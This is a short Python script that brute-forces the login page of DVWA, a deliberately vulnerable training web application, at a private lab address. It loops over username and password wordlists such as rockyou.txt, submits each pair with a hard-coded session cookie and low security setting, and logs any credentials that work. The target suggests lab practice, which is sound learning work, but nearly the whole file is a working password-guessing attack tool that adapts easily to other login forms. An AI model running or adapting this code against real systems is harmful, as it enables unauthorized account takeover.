import requests
import logging  
import chardet

def read_file(file_path):
    with open(file_path, 'rb') as file:
        rawdata = file.read()
    result = chardet.detect(rawdata)
    encoding = result['encoding']
    print(encoding)
    
    with open(file_path, 'r', encoding=encoding) as file:
        return [line.strip() for line in file]


def try_login(target, username, password, cookies):
    response = requests.get(target,params={"username": username, "password": password}, cookies=cookies)
    return "Username and/or password incorrect." not in response.text


def brute_force(target, usernames, passwords, cookies):
    for username in usernames:
        for password in passwords:
            logging.info(f"Trying username = {username} password = {password}")
            print(f"Trying username = {username} password = {password}")
            if try_login(target, username, password, cookies):
                logging.info(f"Found credentials: username = {username} password = {password}")
                return username, password
    return None, None

def main():
    logging.basicConfig(filename='app.log', filemode='w', format='%(name)s - %(levelname)s - %(message)s', level=logging.INFO)


    # usernameFilePath = "rockyou.txt"
    passwordFilePath = "rockyou.txt"
    usernameFilePath = "usernames.txt"
    # passwordFilePath = "passwords.txt"
    PHPSESSID = "b7484782a4776621097ca4a73daf1e62"
    security = "low"
    cookies = {"PHPSESSID": PHPSESSID, "security": security}
    target = "http://192.168.59.101/dvwa/vulnerabilities/brute/?username={username}&password={password}&Login=Login#"

    usernames = read_file(usernameFilePath)
    passwords = read_file(passwordFilePath)

    username, password = brute_force(target, usernames, passwords, cookies)
    if username and password:
        logging.info(f"Credentials found: {username}:{password}")
    else:
        logging.info("No valid credentials found.")

if __name__ == "__main__":
    main()